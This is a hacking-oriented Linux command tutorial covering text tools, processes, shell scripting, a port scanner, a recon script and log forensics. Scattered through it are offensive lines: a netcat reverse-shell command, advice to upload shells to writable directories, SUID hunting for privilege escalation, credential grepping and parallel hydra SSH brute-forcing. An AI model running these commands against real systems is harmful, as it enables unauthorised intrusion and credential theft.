1. Advanced File Operations: Search & Destroy

Linux is 90% text files. Mastering text manipulation is like gaining superpowers. These tools will save you HOURS of manual work.

find - The Ultimate File Hunter

find searches EVERYTHING. It's slower than locate but way more powerful.

# Find all files modified in last 7 days

find /home -type f -mtime -7

# Find files larger than 100MB

find / -type f -size +100M

# Find SUID binaries (privilege escalation gold)

find / -perm -4000 -type f 2>/dev/null

# Find writable directories (upload shells here)

find / -type d -writable 2>/dev/null

# Find and delete all .tmp files

find /tmp -name "*.tmp" -delete

# Execute command on each result

find . -name "*.log" -exec rm {} \;

üí° Hacker Tip: Always append 2>/dev/null to hide "Permission denied" errors. Keeps your scan quiet.

grep - Pattern Matching Master

grep searches INSIDE files for patterns. It's your best friend for finding passwords, API keys, and secrets.

# Basic search

grep "password" /etc/config.txt

# Case-insensitive search

grep -i "PASSWORD" file.txt

# Recursive search in all files

grep -r "API_KEY" /var/www/

# Show 3 lines before and after match (context)

grep -C 3 "admin" access.log

# Count matches

grep -c "error" /var/log/apache2/error.log

# Find lines NOT matching pattern

grep -v "^#" config.conf # Exclude comments

# Regex: Find IP addresses

grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" access.log

üéØ Real Use: grep -r "password\|api_key\|secret" /var/www/ finds hardcoded credentials in web apps.

sed - Stream Editor for Text Ninja Surgery

sed edits text WITHOUT opening a file. It's perfect for automation and scripting.

# Replace first occurrence

sed 's/old/new/' file.txt

# Replace ALL occurrences (g = global)

sed 's/old/new/g' file.txt

# Replace IN-PLACE (modify file directly)

sed -i 's/localhost/10.10.10.10/g' config.php

# Delete lines matching pattern

sed '/^#/d' file.txt # Delete comment lines

# Print only lines 10-20

sed -n '10,20p' large.log

# Insert line before pattern

sed '/pattern/i\New line above' file.txt

‚ö†Ô∏è Warning: -i flag PERMANENTLY modifies files. Test without it first!

awk - The Data Processing Powerhouse

awk is a programming language disguised as a command. It processes text column-by-column.

# Print first column

awk '{print $1}' file.txt

# Print multiple columns with custom separator

awk '{print $1 " -> " $3}' access.log

# Sum numbers in column 3

awk '{sum+=$3} END {print sum}' data.txt

# Filter rows where column 2 > 100

awk '$2 > 100' numbers.txt

# Parse CSV (comma-separated)

awk -F',' '{print $1,$3}' data.csv

# Count unique IPs in access log

awk '{print $1}' access.log | sort | uniq -c | sort -nr

üìä Common Use: Log analysis. Extract IPs, count requests, find anomalies.

2. Process Management: Control the Chaos

Every program running is a "process". As a hacker, you'll kill malicious processes, hide your own, and escalate privileges through them.

ps - Process Status

ps shows running processes. Each process has a PID (Process ID).

# Show all processes (BSD style)

ps aux

# Show process tree (parent-child relationships)

ps auxf

# Find specific process

ps aux | grep apache2

# Show processes by user

ps -u www-data

# Sort by CPU usage

ps aux --sort=-%cpu | head

# Sort by memory usage

ps aux --sort=-%mem | head

üîç Columns Explained: USER (who owns it), PID (process ID), %CPU, %MEM, COMMAND (what's running)

top/htop - Real-Time Process Monitor

top is like Task Manager for Linux. htop is prettier (install with sudo apt install htop).

# Launch interactive monitor

top

# Better version with colors

htop

# Monitor specific user

top -u www-data

Inside top: Press M to sort by memory, P for CPU, k to kill a process, q to quit.

kill - Terminate Processes

kill sends signals to processes. Most common: terminate gracefully or FORCE kill.

# Gracefully stop process (SIGTERM)

kill 1234

# FORCE kill (SIGKILL) - use when process won't die

kill -9 1234

# Kill by process name

killall apache2

# Kill all processes by user

pkill -u username

# Kill all matching pattern

pkill -f "python.*server"

‚ö†Ô∏è Danger: kill -9 -1 kills EVERYTHING (including your session). Never run this!

Background Jobs & Job Control

Run commands in background, pause them, bring them back. Essential for multitasking.

# Run command in background (& at end)

python3 server.py &

# Pause running command (Ctrl+Z)

[Ctrl+Z] # Pauses current process

# Resume in background

bg

# Bring back to foreground

fg

# List background jobs

jobs

# Resume specific job

fg %1 # Bring job #1 to foreground

# Run command even after logout (nohup)

nohup python3 server.py > output.log 2>&1 &

üí° Hacker Use: Start reverse shell in background: nc -e /bin/bash 10.10.10.5 4444 &

3. Shell Scripting: Automate Everything

Why click 100 times when you can script it once? Shell scripts are mini-programs that automate tasks. Every hacker has a toolkit of scripts.

Script Basics

# Create script file

nano myscript.sh

# First line MUST be shebang (tells system which interpreter to use)

#!/bin/bash

echo "Hello, World!"

# Make executable

chmod +x myscript.sh

# Run script

./myscript.sh

Variables & User Input

#!/bin/bash

# Variables (no spaces around =)

NAME="John"

AGE=25

echo "Hello, $NAME. You are $AGE years old."

# User input

read -p "Enter target IP: " IP

echo "Scanning $IP..."

# Command substitution

CURRENT_USER=$(whoami)

echo "Current user: $CURRENT_USER"

# Arguments

echo "Script name: $0"

echo "First arg: $1"

echo "All args: $@"

Conditionals (if/else)

#!/bin/bash

if [ "$1" == "admin" ]; then

echo "Welcome, admin!"

elif [ "$1" == "user" ]; then

echo "Welcome, user"

else

echo "Unknown user"

fi

# File checks

if [ -f "file.txt" ]; then

echo "File exists"

fi

# Number comparisons

if [ $AGE -gt 18 ]; then # -gt = greater than

echo "Adult"

fi

Common tests: -f (file exists), -d (directory), -z (empty string), -n (not empty)

Loops (for & while)

# For loop - iterate over list

for i in 1 2 3 4 5; do

echo "Number: $i"

done

# For loop - range

for i in {1..10}; do

echo "Count: $i"

done

# Loop through files

for file in *.txt; do

echo "Processing $file"

done

# While loop

counter=1

while [ $counter -le 5 ]; do

echo "Loop $counter"

((counter++))

done

# Read file line by line

while IFS= read -r line; do

echo "Line: $line"

done < file.txt

Functions

#!/bin/bash

function greet() {

echo "Hello, $1!"

}

greet "Alice" # Call function

# Function with return value

function add() {

result=$(($1 + $2))

echo $result

}

sum=$(add 5 3)

echo "Sum: $sum"

Real Hacking Script Example: Port Scanner

#!/bin/bash

# Simple port scanner

read -p "Enter target IP: " TARGET

echo "Scanning $TARGET..."

for PORT in {1..1000}; do

timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && \

echo "Port $PORT is OPEN"

done

echo "Scan complete!"

‚úÖ This works! Save as portscan.sh, make executable, run: ./portscan.sh

7. Advanced Shell Scripting: Automation Mastery

Error Handling & Debugging

#!/bin/bash

# Enable strict error handling

set -euo pipefail # Exit on error, undefined vars, pipe failures

set -x # Debug mode - print each command


# Custom error handler

error_exit() {

echo "Error: $1" >&2

exit 1

}


# Trap errors and cleanup

cleanup() {

echo "Cleaning up..."

rm -f /tmp/tempfile.$$

}

trap cleanup EXIT ERR


# Command existence check

command -v nmap >/dev/null 2>&1 || error_exit "nmap not installed"


# Logging with timestamps

log() {

echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*" | tee -a scan.log

}

log "Starting network scan..."

Real-World Penetration Testing Script

#!/bin/bash

# Automated Recon Script for Bug Bounty / Pentesting


TARGET="$1"

OUTPUT_DIR="recon_${TARGET}"


# Validation

[[ -z "$TARGET" ]] && { echo "Usage: $0 target.com"; exit 1; }

mkdir -p "$OUTPUT_DIR"


# Subdomain Enumeration

echo "[+] Finding subdomains..."

subfinder -d "$TARGET" -o "$OUTPUT_DIR/subdomains.txt" -silent

amass enum -passive -d "$TARGET" -o "$OUTPUT_DIR/amass.txt"

cat "$OUTPUT_DIR"/*.txt | sort -u > "$OUTPUT_DIR/all_subdomains.txt"


# Check which subdomains are alive

echo "[+] Checking live hosts..."

httpx -l "$OUTPUT_DIR/all_subdomains.txt" -o "$OUTPUT_DIR/live_hosts.txt" -silent


# Port scanning (fast but thorough)

echo "[+] Port scanning..."

nmap -iL "$OUTPUT_DIR/live_hosts.txt" -T4 -A -oN "$OUTPUT_DIR/nmap.txt"


# Directory bruteforce

echo "[+] Directory fuzzing..."

while IFS= read -r host; do

gobuster dir -u "$host" -w /usr/share/wordlists/dirb/common.txt \

-o "$OUTPUT_DIR/dirs_$(echo $host | tr '/:' '_').txt" -q

done < "$OUTPUT_DIR/live_hosts.txt"


# Screenshot all sites

echo "[+] Taking screenshots..."

gowitness file -f "$OUTPUT_DIR/live_hosts.txt" --screenshot-path "$OUTPUT_DIR/screenshots"


# Generate report

echo "[+] Generating report..."

cat << EOF > "$OUTPUT_DIR/report.html"

Recon Report: $TARGET

Reconnaissance Report

Target: $TARGET

Subdomains Found: $(wc -l < "$OUTPUT_DIR/all_subdomains.txt")

EOF


echo "[+] Recon complete! Results in $OUTPUT_DIR/"

Parallel Processing for Speed

Process multiple targets simultaneously using GNU Parallel:

# Sequential (slow) - one at a time

while read ip; do nmap $ip; done < ips.txt


# Parallel (FAST) - 10 at once

parallel -j 10 nmap {} :::: ips.txt


# Ping sweep 100 IPs in parallel

seq 1 100 | parallel -j 50 'ping -c1 192.168.1.{} | grep "bytes from"'


# Download multiple files at once

cat urls.txt | parallel -j 20 wget {}


# Crack passwords in parallel

parallel -j 4 hydra -l admin -p {} 192.168.1.1 ssh :::: passwords.txt

8. Log Analysis & Digital Forensics

Logs tell the story of what happened. As a hacker, you hunt for clues. As a defender, you hunt for attacks.

Critical Log Files

# Authentication logs (failed logins, sudo usage)

/var/log/auth.log # Debian/Ubuntu

/var/log/secure # RedHat/CentOS


# System messages

/var/log/syslog # General system log

/var/log/messages # RedHat systems


# Kernel ring buffer

dmesg # Hardware/driver messages


# Web server logs

/var/log/apache2/access.log

/var/log/nginx/access.log


# Last logins

last # Show login history

lastb # Show bad login attempts

w # Who's logged in now

Hunting for Suspicious Activity

# Find failed SSH login attempts

grep "Failed password" /var/log/auth.log


# Count attempts by IP

grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr


# Find successful root logins

grep "session opened for user root" /var/log/auth.log


# Check for new users added

grep "useradd" /var/log/auth.log


# Find large file transfers (potential data exfiltration)

awk '$10 > 10000000' /var/log/apache2/access.log


# Detect port scans

grep "SYN" /var/log/syslog | awk '{print $NF}' | sort | uniq -c | sort -nr | head -20


# Find commands run with sudo

grep "sudo.*COMMAND" /var/log/auth.log


# Check for reverse shells (common backdoor ports)

netstat -antp | grep -E ":(4444|5555|6666|7777|8888|9999)"

‚ö†Ô∏è Red Flag: Multiple failed logins from same IP = brute force attack. Successful login after failures = possible compromise!

Timeline Analysis for Incident Response

Reconstruct what happened during a breach:

# Create timeline of all security events

cat /var/log/auth.log | grep -E "Failed|session opened|sudo" | sort -k1,2


# File modification timeline (what files changed?)

find / -type f -mtime -1 -ls 2>/dev/null # Last 24 hours


# Check file access times (stat command)

stat /etc/passwd

# Access: 2025-12-13 14:23:45 (when file was read)

# Modify: 2025-12-13 12:10:32 (when content changed)

# Change: 2025-12-13 12:10:32 (when metadata changed)


# Check command history of all users

for user in $(cut -d: -f1 /etc/passwd); do

history_file="/home/$user/.bash_history"

[[ -f $history_file ]] && echo "=== $user ===" && tail -20 $history_file

done


# Network connections at time of incident

grep "Dec 13 14:" /var/log/syslog | grep -E "ESTABLISHED|LISTEN"

9. Performance Tuning: Making Linux FAST

System Resource Monitoring

# htop - Better than top (install it!)

sudo apt install htop

htop

# F2=setup, F6=sort, F9=kill, F10=quit


# Check disk I/O (who's hammering the disk?)

iotop -o # Only show processes doing I/O


# Network bandwidth usage per process

sudo apt install nethogs

sudo nethogs


# Memory usage breakdown

free -h # Human-readable

cat /proc/meminfo # Detailed info

ps aux --sort=-%mem | head -10 # Top memory hogs


# CPU info

lscpu # CPU architecture details

cat /proc/cpuinfo # Detailed per-core info

uptime # Load average


# Disk usage

df -h # Filesystem usage

du -sh /* # Size of root directories

ncdu / # Interactive disk analyzer

Kill Zombie Processes

# Find zombies

ps aux | grep 'Z'


# Kill process by name

pkill firefox

killall chrome


# Force kill stuck process

kill -9


# Kill all processes by user

pkill -u username


# Kill parent of zombie to reap it

ps -o ppid= -p | xargs kill
